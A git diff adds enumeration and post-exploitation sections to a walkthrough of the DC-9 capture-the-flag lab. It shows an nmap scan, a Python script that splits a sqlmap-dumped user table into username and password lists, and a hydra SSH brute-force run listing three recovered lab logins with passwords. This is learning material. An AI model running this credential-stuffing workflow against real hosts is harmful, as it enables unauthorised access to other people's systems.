@@ -1,5 +1,28 @@
 # DC - 09 Walkthrough
 
+## Enumeration
+
+### Nmap
+
+```sh
+┌──(kali㉿kali)-[~/Desktop/wallthrough]
+└─$ sudo nmap 192.168.182.134 -sSCV 
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-07 23:20 PST
+Nmap scan report for 192.168.182.134
+Host is up (0.0026s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+22/tcp filtered ssh
+80/tcp open     http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Example.com - Staff Details - Welcome
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 00:0C:29:C7:FE:46 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
+```
+
 ## Exploitation
 
 ```sh
@@ -52,3 +75,44 @@ Table: UserDetails
 ```
 
 Got the username and password. Now I extract them from CSV file, using Python script:
+
+```
+import csv
+
+file_path = "/home/kali/.local/share/sqlmap/output/192.168.182.134/dump/users/UserDetails.csv"
+
+f = open(file_path, 'r')
+f_username = open('usernames.txt', 'w')
+f_password = open('password.txt', 'w')
+
+csv_reader = csv.DictReader(f)
+row_number = 0
+
+for row in csv_reader:
+        if row_number == 0:
+                row_number += 1
+        else:
+                row_number += 1
+                username = row['username']
+                password = row['password']
+                f_username.write(username + "\n")
+                f_password.write(password + "\n")
+```
+
+Using `usernames.txt``` and `password.txt``` to try logging to target via ssh:
+
+```sh
+┌──(kali㉿kali)-[~/Desktop/wallthrough]
+└─$ hydra -L usernames.txt -P password.txt 192.168.182.134 ssh
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-07 23:26:27
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 256 login tries (l:16/p:16), ~16 tries per task
+[DATA] attacking ssh://192.168.182.134:22/
+[22][ssh] host: 192.168.182.134   login: chandlerb   password: UrAG0D!
+[22][ssh] host: 192.168.182.134   login: joeyt   password: Passw0rd
+[22][ssh] host: 192.168.182.134   login: janitor   password: Ilovepeepee
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-07 23:27:16
+```
